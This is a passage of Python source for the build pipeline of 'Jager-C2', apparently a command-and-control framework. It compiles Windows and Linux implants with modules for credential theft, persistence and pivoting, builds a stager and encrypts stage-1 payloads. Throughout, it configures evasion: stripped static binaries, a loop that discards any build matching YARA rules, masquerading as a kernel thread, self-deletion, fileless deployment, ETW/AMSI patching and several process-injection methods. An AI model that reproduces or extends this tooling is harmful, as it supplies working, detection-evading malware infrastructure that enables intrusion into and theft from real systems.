        }

        meta_path = out_path.with_suffix('.json')
        with open(meta_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        return metadata

    @staticmethod
    def _find_custom_deps_dir() -> Path | None:
        """Locate the minimal static curl built by scripts/build-static-deps.sh."""
        deps = Path(__file__).parent.parent / 'deps'
        if (deps / 'lib' / 'libcurl.a').exists():
            return deps
        return None

    @staticmethod
    def _detect_static_libs(custom_deps: Path | None = None) -> dict:
        """Probe for static .a libraries required by the Linux implant.

        Checks custom deps dir first (minimal curl), then system paths.
        """
        system_lib = Path("/usr/lib/x86_64-linux-gnu")
        alt_lib = Path("/usr/lib")
        required = {
            "libcurl.a": "run jager/scripts/build-static-deps.sh",
            "libssl.a": "apt install libssl-dev",
            "libcrypto.a": "apt install libssl-dev",
            "libz.a": "apt install zlib1g-dev",
        }
        found = {}
        missing = []
        for lib, fix in required.items():
            path = None
            if custom_deps and (custom_deps / 'lib' / lib).exists():
                path = custom_deps / 'lib' / lib
            elif (system_lib / lib).exists():
                path = system_lib / lib
            elif (alt_lib / lib).exists():
                path = alt_lib / lib
            if path:
                found[lib] = str(path)
            else:
                missing.append(f"{lib} ({fix})")
        return {"found": found, "missing": missing, "all_present": len(missing) == 0}

    def _compile_linux_implant(self, config: BuildConfig) -> dict:
        """Compile a fully static Linux ELF implant from jager/implant-linux.

        Uses a minimal custom libcurl (built by scripts/build-static-deps.sh)
        linked with only OpenSSL. No krb5/ldap/ssh2/nghttp/brotli/psl deps.
        Produces a portable binary with zero runtime library dependencies.
        """
        linux_root = Path(__file__).parent.parent / 'implant-linux'
        if not linux_root.is_dir():
            return {"success": False, "error": f"Linux implant source not found: {linux_root}"}

        custom_deps = self._find_custom_deps_dir()
        static_info = self._detect_static_libs(custom_deps)
        if not static_info["all_present"]:
            return {
                "success": False,
                "error": (
                    f"Static libraries missing: {static_info['missing']}. "
                    "Run jager/scripts/build-static-deps.sh to build them."
                ),
            }

        sources = [
            'src/core/beacon.c',
            'src/core/transport.c',
            'src/core/transport_failover.c',
            'src/core/tasks.c',
            'src/core/process.c',
            'src/core/malleable.c',
            'src/util/json.c',
            'src/util/json_emit.c',
            'src/util/base64.c',
            'src/util/crypto.c',
            'src/util/random.c',
            'src/evasion/anti_analysis.c',
            'src/evasion/process.c',
            'src/evasion/sleep_encrypt.c',
            'src/postex/credentials.c',
            'src/postex/discovery.c',
            'src/postex/persistence.c',
            'src/postex/auto_enum.c',
            'src/postex/screenshot.c',
            'src/filesystem/fs.c',
            'src/pivot/socks.c',
            'src/pivot/tunnel.c',
            'src/pivot/portfwd.c',
            'src/pivot/p2p.c',
            'src/execution/module_loader.c',
        ]

        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        build_id = secrets.token_hex(4)
        config.build_id = build_id
        compile_flags = config.to_compile_flags()
        compile_flags.append('-DLINUX_IMPLANT')
        compile_flags.append('-DCURL_STATICLIB')
        compile_flags.append('-Wno-deprecated-declarations')
        compile_flags.append('-Wno-format-truncation')

        include_dirs = ['-I', str(linux_root / 'include')]
        lib_dirs = []
        if custom_deps:
            include_dirs.extend(['-I', str(custom_deps / 'include')])
            lib_dirs.append(f'-L{custom_deps / "lib"}')

        out_name = f"implant-linux-{build_id}-{timestamp}"
        out_path = (self.output_dir / out_name).resolve()
        src_paths = [str(linux_root / s) for s in sources]

        cmd = [
            'gcc', '-std=gnu11',
            '-D__GLIBC_USE_ISOC2X=0',
            '-Wall', '-Os', '-s',
            '-ffunction-sections', '-fdata-sections',
            '-fvisibility=hidden',
            '-static',
            *include_dirs,
            *compile_flags,
            *src_paths,
            '-o', str(out_path),
            *lib_dirs,
            '-lcurl', '-lssl', '-lcrypto', '-lzstd', '-lz',
            '-lpthread', '-ldl',
            '-Wl,--gc-sections',
            '-Wl,--whole-archive', '-lpthread', '-Wl,--no-whole-archive',
        ]

        print(f"[*] Compiling Linux implant (static): gcc -static -> {out_name}")
        if custom_deps:
            print(f"[*] Using custom minimal curl from {custom_deps}")
        result = subprocess.run(cmd, capture_output=True, text=True, cwd=str(linux_root))

        if result.returncode != 0:
            print(f"[-] Static compilation failed:\n{result.stderr}")
            return {"success": False, "error": result.stderr}

        # Post-link: aggressive strip (removes .comment, .note sections too)
        subprocess.run(['strip', '--strip-all', '--remove-section=.comment',
                        '--remove-section=.note', '--remove-section=.note.gnu.build-id',
                        str(out_path)], capture_output=True)

        is_static = self._verify_static_binary(str(out_path))
        if not is_static:
            print("[!] FAIL: Binary is not fully static. Check linker output.")
            os.remove(out_path)
            return {"success": False, "error": "Binary not fully static; check build deps"}

        sha256 = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()
        file_size = os.path.getsize(out_path)

        try:
            passed, matches = self.validator.validate(str(out_path), is_linux=True)
        except BuildError as exc:
            print(f"[!] {exc}")
            os.remove(out_path)
            return {"success": False, "error": str(exc)}
        if not passed:
            print(f"[!] YARA MATCH DETECTED: {matches}")
            os.remove(out_path)
            return {"success": False, "error": f"YARA matches: {matches}"}

        print(f"[+] Linux build successful (static): {out_name} ({file_size} bytes)")
        print(f"[+] SHA256: {sha256}")

        metadata = {
            "success": True,
            "build_id": build_id,
            "filename": out_name,
            "path": str(out_path),
            "sha256": sha256,
            "size": file_size,
            "arch": config.arch,
            "platform": "linux",
            "format": "elf",
            "static": True,
            "c2_url": config.c2_url,
            "profile_id": self.profile.profile["engagement_id"],
            "kill_date": config.kill_date,
            "timestamp": timestamp,
            "yara_clean": passed,
            "evasion": {
                "anti_analysis": bool(config.anti_analysis),
                "heap_encrypt": bool(config.heap_encrypt),
                "jitter_percent": config.jitter_percent,
                "sleep_seconds": config.sleep_seconds,
                "process_masquerade": "[kworker/u8:1-events]",
                "self_delete": True,
                "fileless_deploy": True,
                "malleable_wire": bool(self.profile.profile.get("malleable_wire")),
            },
        }

        meta_path = out_path.with_suffix('.json')
        with open(meta_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        return metadata

    @staticmethod
    def _verify_static_binary(binary_path: str) -> bool:
        """Verify an ELF binary is fully statically linked via readelf."""
        try:
            result = subprocess.run(
                ['readelf', '-d', binary_path],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode != 0:
                result2 = subprocess.run(
                    ['file', binary_path],
                    capture_output=True, text=True, timeout=5,
                )
                return 'statically linked' in result2.stdout
            return 'NEEDED' not in result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def build_stager(self, config: BuildConfig, implant_build_id: str = "") -> dict:
        """Build Stage-0 C stager."""
        print(f"[*] Building C stager for {config.c2_url}")

        stager_src = self.source_dir / 'src' / 'stager' / 'stager.c'
        if not stager_src.exists():
            return {"success": False, "error": f"Stager source not found: {stager_src}"}

        cc = 'x86_64-w64-mingw32-gcc' if config.arch == 'x64' else 'i686-w64-mingw32-gcc'
        build_id = secrets.token_hex(4)
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        out_name = f"stager-{build_id}-{timestamp}.exe"
        out_path = (self.output_dir / out_name).resolve()

        stager_flags = config.to_stager_flags(implant_build_id)

        cmd = [
            cc, '-Wall', '-Os', '-s', '-mwindows',
            '-DWIN32_LEAN_AND_MEAN',
            *stager_flags,
            str(stager_src),
            '-o', str(out_path),
            '-lwinhttp', '-lbcrypt', '-ladvapi32',
            '-Wl,--gc-sections',
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[-] Stager build failed:\n{result.stderr}")
            return {"success": False, "error": result.stderr}

        sha256 = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()
        try:
            passed, matches = self.validator.validate(str(out_path))
        except BuildError as exc:
            print(f"[!] {exc}")
            if out_path.exists():
                os.remove(str(out_path))
            return {"success": False, "error": str(exc)}

        if not passed:
            os.remove(str(out_path))
            return {"success": False, "error": f"Stager YARA validation failed: {matches}"}

        print(f"[+] Stager built: {out_name} ({os.path.getsize(out_path)} bytes)")
        print(f"[+] SHA256: {sha256}")

        return {
            "success": True,
            "build_id": build_id,
            "filename": out_name,
            "path": str(out_path),
            "sha256": sha256,
            "size": os.path.getsize(out_path),
            "yara_clean": passed,
        }

    def encrypt_stage1(self, implant_path: str) -> str:
        """Encrypt Stage-1 implant for delivery by Stage-0."""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

        key = bytes.fromhex(self.profile.aes_key)
        iv = bytes.fromhex(self.profile.aes_iv)

        with open(implant_path, 'rb') as f:
            plaintext = f.read()

        cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()

        out_path = implant_path + '.enc'
        with open(out_path, 'wb') as f:
            f.write(ciphertext)

        print(f"[+] Encrypted Stage-1: {out_path} ({len(ciphertext)} bytes)")
        return str(out_path)


def _load_profile(profile_path: str | None, profile_json: str | None) -> IOCProfile:
    """Load IOC profile; prefer engagement seed from overlay when present."""
    overlay = {}
    if profile_json and os.path.exists(profile_json):
        with open(profile_json) as f:
            overlay = json.load(f)
        _validate_overlay(overlay)
    eid = overlay.get("engagement_id")
    nonce = overlay.get("build_nonce", "")
    if eid:
        profile = IOCProfile.from_engagement_seed(eid, nonce, profile_path)
    else:
        profile = IOCProfile(profile_path)
    if profile_json:
        profile.apply_malleable_overlay(profile_json)
    return profile


VALID_INJECT_METHODS = {"none", "classic", "threadless", "hollow", "apc"}
VALID_SLEEP_TECHNIQUES = {"none", "basic", "timer", "ekko", "foliage", "zilean", "hwbp", "threadpool"}
SLEEP_TECHNIQUE_MAP = {"none": 0, "basic": 0, "timer": 3, "ekko": 1, "foliage": 2, "zilean": 3, "hwbp": 4, "threadpool": 5}


def _validate_evasion(ev: dict) -> tuple[str, str]:
    """Validate evasion block; return (inject_method, sleep_technique) strings."""
    method = ev.get("inject_method", "threadless")
    if isinstance(method, int):
        inv = {0: "classic", 1: "threadless", 2: "hollow", 3: "apc"}
        method = inv.get(method, "threadless")
    method = str(method).lower()
    if method not in VALID_INJECT_METHODS:
        raise ValueError(f"Unknown injection method: {method}")

    sleep = ev.get("sleep_technique", "foliage")
    if isinstance(sleep, int):
        inv = {0: "none", 1: "ekko", 2: "foliage", 3: "zilean"}
        sleep = inv.get(sleep, "foliage")
    sleep = str(sleep).lower()
    if sleep not in VALID_SLEEP_TECHNIQUES:
        raise ValueError(f"Unknown sleep technique: {sleep}")
    return method, sleep


def _evasion_kwargs(profile: IOCProfile) -> dict:
    """Map profile evasion block onto BuildConfig kwargs."""
    ev = profile.profile.get("evasion") or {}
    if ev:
        _validate_evasion(ev)
    kw = {}
    for key in ("patch_etw", "patch_amsi", "unhook_on_load", "heap_encrypt", "anti_analysis"):
        if key in ev:
            kw[key] = bool(ev[key])
    if st := ev.get("sleep_technique"):
        if isinstance(st, str):
            kw["sleep_technique"] = SLEEP_TECHNIQUE_MAP.get(st.lower(), 2)
        else:
            kw["sleep_technique"] = int(st)
    if sm := ev.get("syscall_method"):
        mapping = {"none": 0, "indirect": 1, "direct": 2}
        if isinstance(sm, str):
            kw["syscall_method"] = mapping.get(sm.lower(), 1)
        else:
            kw["syscall_method"] = int(sm)
    if abm := ev.get("amsi_bypass_method"):
        kw["amsi_bypass_method"] = abm
    if im := ev.get("inject_method"):
        mapping = {"classic": 0, "threadless": 1, "hollow": 2, "apc": 3}
        if isinstance(im, str):
            kw["inject_method"] = mapping.get(im.lower(), 1)
        else:
            kw["inject_method"] = int(im)
    return kw


def run_build_pipeline(
    c2_url: str,
    output_dir: str,
    *,
    output_format: str = "exe",
    arch: str = "x64",
    platform: str = "windows",
    sleep: int = 60,
    jitter: int = 20,
    kill_date: int = 0,
    build_stager: bool = False,
    polymorphic: bool = True,
    profile_path: str | None = None,
    profile_json: str | None = None,
    source_dir: str | None = None,
) -> dict:
    """Machine-facing build API invoked by the teamserver (C2-owned payload generation)."""
    profile = _load_profile(profile_path, profile_json)
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)

    if not profile_path:
        eid = _validate_engagement_id(profile.profile['engagement_id'])
        profile.save(str(out / f"profile-{eid}.json"))

    if platform == 'linux':
        src = source_dir or str(Path(__file__).parent.parent / "implant-linux")
    else:
        src = source_dir or str(Path(__file__).parent.parent / "implant")
    builder = ImplantBuilder(src, str(out), profile)
    build_cfg = BuildConfig(
        c2_url=c2_url,
        profile=profile,
        format=output_format,
        arch=arch,
        platform=platform,
        sleep=sleep,
        jitter=jitter,
        kill_date=kill_date,
        **_evasion_kwargs(profile),
    )

    implant = builder.build_implant(build_cfg, polymorphic=polymorphic)
    if not implant.get("success"):
        return implant

    build_id = implant["build_id"]

    result: dict = {
        "success": True,
        "build_id": build_id,
        "implant": implant,
        "profile_id": profile.profile["engagement_id"],
    }

    if platform != 'linux':
        enc_path = builder.encrypt_stage1(implant["path"])
        result["encrypted_stage_path"] = enc_path
        result["stage_url"] = f"/api/v1/stage?id={build_id}"

    if build_stager and platform != 'linux':
        stager = builder.build_stager(build_cfg, implant_build_id=build_id)
        result["stager"] = stager
        if not stager.get("success"):
            result["success"] = False
            result["error"] = stager.get("error", "stager build failed")

    return result


def run_build_stager(
    c2_url: str,
    output_dir: str,
    implant_build_id: str,
    *,
    profile_path: str | None = None,
    source_dir: str | None = None,
) -> dict:
    """Build C stager for an existing implant build_id."""
    if not profile_path:
        profile_path = _find_profile_for_implant(output_dir, implant_build_id)
    profile = IOCProfile(profile_path)
    src = source_dir or str(Path(__file__).parent.parent / "implant")
    builder = ImplantBuilder(src, output_dir, profile)
    build_cfg = BuildConfig(c2_url=c2_url, profile=profile)
    return builder.build_stager(build_cfg, implant_build_id=implant_build_id)


def _find_profile_for_implant(output_dir: str, implant_build_id: str) -> str | None:
    out = Path(output_dir)
    for meta in sorted(out.glob(f"implant-{implant_build_id}-*.json")):
        try:
            data = json.loads(meta.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            continue
        pid = data.get("profile_id")
        if pid:
            candidate = out / f"profile-{pid}.json"
            if candidate.is_file():
                return str(candidate)
    fallback = out / "profile.json"
    return str(fallback) if fallback.is_file() else None


# --- CLI Entry Point ---

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Jager-C2 Polymorphic Build Pipeline')
    parser.add_argument('--c2-url', default='http://127.0.0.1:31338', help='C2 callback URL')
    parser.add_argument('--dry-run', action='store_true',
                        help='Apply polymorphic transforms only (no compile)')
    parser.add_argument('--seed', type=int, help='Deterministic polymorphic seed')
    parser.add_argument('--output-dir', help='Output directory (alias for --output in dry-run mode)')
    parser.add_argument('--profile', help='IOC profile JSON path')
    parser.add_argument('--profile-json', help='Malleable overlay JSON from teamserver (paths, user-agent)')
    parser.add_argument('--output', default='./builds', help='Output directory')
    parser.add_argument('--format', choices=['exe', 'dll', 'shellcode', 'elf'], default='exe')
    parser.add_argument('--platform', choices=['windows', 'linux'], default='windows',
                        help='Target platform (windows=MinGW, linux=gcc ELF)')
    parser.add_argument('--arch', choices=['x64', 'x86'], default='x64')
    parser.add_argument('--sleep', type=int, default=60)
    parser.add_argument('--jitter', type=int, default=20)
    parser.add_argument('--kill-date', type=int, default=0)
    parser.add_argument('--build-stager', action='store_true')
    parser.add_argument('--pipeline', action='store_true', help='Implant + encrypt + optional stager (teamserver mode)')
    parser.add_argument('--implant-build-id', help='Existing implant build_id for stager-only builds')
    parser.add_argument('--polymorphic', action=argparse.BooleanOptionalAction, default=True)
    parser.add_argument('--result-file', help='Write JSON result here (logs stay on stderr)')
    parser.add_argument('--encrypt-stage1', help='Path to implant to encrypt')

    args = parser.parse_args()

    if args.platform == 'linux' and args.format == 'exe':
        args.format = 'elf'

    if args.output_dir:
        args.output = args.output_dir

    def emit(result: dict) -> None:
        payload = json.dumps(result)
        if args.result_file:
            Path(args.result_file).write_text(payload, encoding="utf-8")
        print(payload)

    # Load or generate profile (engagement-seeded when overlay provides engagement_id)
    profile = _load_profile(args.profile, getattr(args, 'profile_json', None))

    # Save profile if newly generated
    if not args.profile:
        os.makedirs(args.output, exist_ok=True)
        profile_path = os.path.join(args.output, 'profile.json')
        profile.save(profile_path)

    if args.platform == 'linux':
        source_dir = str(Path(__file__).parent.parent / 'implant-linux')
    else:
        source_dir = str(Path(__file__).parent.parent / 'implant')

    if args.dry_run:
        seed = args.seed if args.seed is not None else 42
        eid = hashlib.sha256(f"dry-run:{seed}".encode()).hexdigest()[:16]
        profile = IOCProfile.from_engagement_seed(eid, str(seed), args.profile)
        if getattr(args, 'profile_json', None):
            profile.apply_malleable_overlay(args.profile_json)
        builder = ImplantBuilder(source_dir, args.output, profile)
        config = BuildConfig(
            c2_url=args.c2_url,
            profile=profile,
            sleep=args.sleep,
            jitter=args.jitter,
            kill_date=args.kill_date,
            format=args.format,
            arch=args.arch,
            platform=args.platform,
        )
        tree = builder.dry_run_transform(config, seed=seed, output_dir=args.output)
        emit({
            "success": True,
            "dry_run": True,
            "seed": seed,
            "output_dir": str(tree),
        })
        sys.exit(0)

    if not args.c2_url:
        parser.error('--c2-url is required unless --dry-run is set')

    if args.build_stager and args.platform == 'linux':
        parser.error('--build-stager is not supported for --platform linux (stager requires MinGW/Windows)')

    if args.pipeline:
        result = run_build_pipeline(
            args.c2_url,
            args.output,
            output_format=args.format,
            arch=args.arch,
            platform=args.platform,
            sleep=args.sleep,
            jitter=args.jitter,
            kill_date=args.kill_date,
            build_stager=args.build_stager,
            polymorphic=args.polymorphic,
            profile_path=args.profile,
            profile_json=getattr(args, 'profile_json', None),
            source_dir=source_dir,
        )
        emit(result)
        sys.exit(0 if result.get("success") else 1)

    if args.implant_build_id:
        result = run_build_stager(
            args.c2_url,
            args.output,
            args.implant_build_id,
            profile_path=args.profile,
            source_dir=source_dir,
        )
        emit(result)
        sys.exit(0 if result.get("success") else 1)

    builder = ImplantBuilder(source_dir, args.output, profile)

    config = BuildConfig(
        c2_url=args.c2_url,
        profile=profile,
        sleep=args.sleep,
        jitter=args.jitter,
        kill_date=args.kill_date,
        format=args.format,
        arch=args.arch,
        platform=args.platform,
    )

    if args.encrypt_stage1:
        enc = builder.encrypt_stage1(args.encrypt_stage1)
        emit({"success": True, "encrypted_stage_path": enc})
    elif args.build_stager:
        emit(builder.build_stager(config))
    else:
        result = builder.build_implant(config, polymorphic=args.polymorphic)
        if result.get("success") and args.platform != 'linux':
            result["encrypted_stage_path"] = builder.encrypt_stage1(result["path"])
        emit(result)
        sys.exit(0 if result.get("success") else 1)


if __name__ == '__main__':
    main()
